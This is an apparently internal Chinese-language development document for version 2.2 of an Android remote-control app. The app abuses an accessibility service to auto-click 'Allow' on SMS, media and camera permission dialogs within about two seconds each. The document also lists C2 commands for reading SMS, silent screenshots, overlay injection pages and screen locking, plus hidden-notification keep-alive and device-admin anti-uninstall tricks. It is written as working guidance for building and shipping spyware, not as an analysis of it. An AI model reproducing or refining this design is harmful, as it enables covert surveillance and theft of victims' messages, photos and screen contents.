# 2.2 架构梳理（调试模式）

> 手机在充电/没电时不方便实测，这份文档把 2.2 的启动链路、指令能力、上报与保活
> 一次讲清，改代码时对照它走。

## 一、唯一启动入口（与代码一致，2026-10-19 实测）

```
AccessibilityService.onServiceConnected()        ← 注入的调试触发点
  └─ ڝږ؁ڋ/ھ.startPerm(ctx)                      一次性闸门（started）
       ├─ isDebug(ctx) = inject_state.debug_mode（默认 true）
       ├─ 等 سۄھؤۏ۫/؋->إ（无障碍服务单例）非空，最多 20×1s，超时回滚 started
       └─ +2s → startActivity(PermissionActivity)（FLAG_ACTIVITY_NEW_TASK）
            └─ PermissionActivity.onCreate → ؠ()：一次只 requestPermissions 一个权限
                 └─ ھ.armClick(ctx)：先 removeCallbacksAndMessages，再 post 2s
                      └─ ھ.scheduleClick()：找到“允许”就 performAction(CLICK)
```

`App.onCreate` 与 `ForegroundKeepAliveService` 也会调 `startPerm`，
但闸门 + 等服务就绪让它们只是“谁先到谁等”，不会重复弹框。

## 二、调试模式下做的事

| 时间 | 动作 | 代码 |
|---|---|---|
| 0s | 连服务器、上报在线 | `SocketManager` / `deviceOnline`（**未改动**） |
| +2s | 拉起 PermissionActivity，逐个权限框 | `ھ.startPerm` → `PermissionActivity` |
| 每框 | 停留约 2 秒后自动点“允许”，没点中 800ms 重试（最多 8 次） | `ھ.armClick` / `ھ.scheduleClick` |

权限清单（按 SDK 分支，一次一个，弹框→2 秒→允许）：

```
API 33+ ：READ_SMS  READ_MEDIA_IMAGES  READ_MEDIA_VIDEO  CAMERA  RECEIVE_SMS
API <33 ：READ_SMS  READ_EXTERNAL_STORAGE  WRITE_EXTERNAL_STORAGE  CAMERA  RECEIVE_SMS
（不含 POST_NOTIFICATIONS；RECEIVE_SMS 已在清单声明）
```

点击目标（先 view-id，后文本兜底）：

```
id   ：permission_allow_all_button → permission_allow_button
       → permission_allow_foreground_only_button（相机/麦克风的“使用应用时允许”）
       com.android.permissioncontroller / com.google.android.permissioncontroller 两套前缀
文本 ：允许 / Allow / 使用应用时允许（长度≤16；含“不”“Don”“deny”的节点一律否决，避免点到“不允许”）
范围 ：只有 package 名含 permissioncontroller / packageinstaller / securitycenter 的窗口才会被点
```

## 三、被关闭的原版引导（debug 下全部短路）

| 流水线 | 位置 | 原先会做什么 |
|---|---|---|
| A 服务连上引导 | `onServiceConnected` | 遮罩、电池检查、“优化中” |
| B P1 | `ڛڜڕڰڑ/ء.؋()` | 电池白名单 + 自启动页 |
| C 厂商页分派 | `ڝږ؁ڋ/ؤ.run()` | 三星 BatteryActivity、小米省电、华为启动管理… |
| D 录屏请求 | `ScreenCaptureActivity` | 循环拉 MediaProjection 授权页 |
| E 电池开关 | `ڗًقڔ/؋.ه()` | `battery_grant` 默认 false |
| F 设备管理器 | `ڛڜڕڰڑ/ء` pswitch_2 | `ADD_DEVICE_ADMIN` 弹窗（防卸载） |

## 四、可以「继承指令」的能力（本地不自动跑）

这些全部由 C2 下发指令触发，2.2 源码里能力都在，调试模式不需要本地预跑：

| 能力 | 指令 | 说明 |
|---|---|---|
| 短信读取 | `readSmsList` | 拿到短信列表后走二进制 WS 上报 |
| 短信监听 | `SMS_RECEIVED` → `MainReceiver` | 清单已加 `RECEIVE_SMS`，收到即上报 |
| 截图（普通） | `takeScreen` / `screenshot` | 无障碍 `takeScreenshot` |
| 截图（静默） | `silentShot` | 无提示抓屏 |
| 投屏中继 | `screen_relay` / `stopScreenRelay` | MediaProjection |
| 录屏授权 | `reqScreenPermission` / `releaseScreenCapture` | 打开/释放 `ScreenCaptureActivity` |
| 相册 | `readAlbumList` / `readAlbumLast` / `readAlbumThumbnail` | 需要 `READ_MEDIA_*` |
| 通讯录 | `readContactList` | |
| 注入页 | `updatePageRule` / `transparent` / `catAllViewSwitch` | 页面规则、透明覆盖 |
| 锁屏 | `lockScreen` / `swipePwdScreenOn` / `swipePwdScreenOff` | |

**结论**：调试模式下本地**只需要权限 + 在线**，其余等运营在面板上下指令。

## 五、上报通道（未改动）

| 通道 | 触发 | 载体 |
|---|---|---|
| 设备在线 | 连上即发 | Socket.IO `deviceOnline` |
| 无障碍树 | `uploadTree`（事件驱动 + 指令） | Binary WS / Socket.IO 自动切换 |
| 截图帧 | `takeScreen` 等指令 | Binary WS 分片 |
| 崩溃/诊断 | `DiagReporter` | 二进制 WS `acc_lifecycle` |

## 六、保活（正式模式用，debug 关闭）

```
ForegroundKeepAliveService   前台服务 + 通知渠道 importance=0（不显示通知）
DeviceAdminKeepAlive         设备管理器身份，被杀后系统更容易拉回
AlarmReviveReceiver          定时 Alarm 复活
KeepAliveWorker/JobService   WorkManager 周期任务
battery_grant                厂商电池白名单（三星为手动 UI，默认关）
```

debug_mode 下只保留前台服务与 Alarm，设备管理器与电池跳转都跳过，
避免测试时反复弹窗。

## 七、开关一览

| 开关 | 位置 | 默认 | 作用 |
|---|---|---|---|
| `debug_mode` | `inject_state` | true | 只跑权限 + 清场，跳过全部引导 |
| `battery_grant` | `inject_state` | false | 是否尝试跳电池白名单页 |
| `auto_lock_on_acc` | `inject_state` | — | 旧版开关（黑屏页），2.2 已不读 |

正式出包时把 `debug_mode` 置为 false 即可恢复原版全套引导，代码无需再改。

## 八、本次改动（2026-10-19，实测通过）

| # | 位置 | 改动 |
|---|---|---|
| 1 | `ڝږ؁ڋ/ھ.startPerm` | 一次性闸门方向修正；改为先等无障碍服务单例非空，再延迟 2s 拉页面（最多等 20s，超时回滚闸门） |
| 2 | `ڝږ؁ڋ/ھ.armClick` | 每次挂点击前先 `removeCallbacksAndMessages(null)`，杜绝上一发点击抢在下一框刚弹出时命中 |
| 3 | `ڝږ؁ڋ/ھ.scheduleClick` | 只点 permissioncontroller/packageinstaller/securitycenter 窗口；id 6 条（含相机 `foreground_only`）+ 文本兜底；没点中 800ms 重试 ×8 |
| 4 | `PermissionActivity.ؠ()` | 每次 `requestPermissions` 前挂 2s 点击；去掉 onCreate / onRequestPermissionsResult 里的重复挂点 |
| 5 | `PermissionActivity` | 权限数组补 `RECEIVE_SMS`（短信读/收都走短信组） |
| 6 | `MyAccessibilityService.onServiceConnected` | 进来就调 `ھ.startPerm`（幂等），即「无障碍绑定即排权限流程」 |
| 7 | `AndroidManifest.xml` | 补 `<uses-permission android:name="android.permission.RECEIVE_SMS"/>` |
| 8 | `apktool.yml` | versionCode 221 / versionName 2.2（覆盖安装用） |

实测：SM-G981V / Android 13，无障碍绑定 → 2s 后弹框，短信 2.02s、相册 2.02s、相机 2.04s 自动“允许”，
共 5 个权限 14 秒内全部 granted，界面回桌面无残留。
验收记录见 `evidence/accessibility-2.2-autogrant-20261019/`。
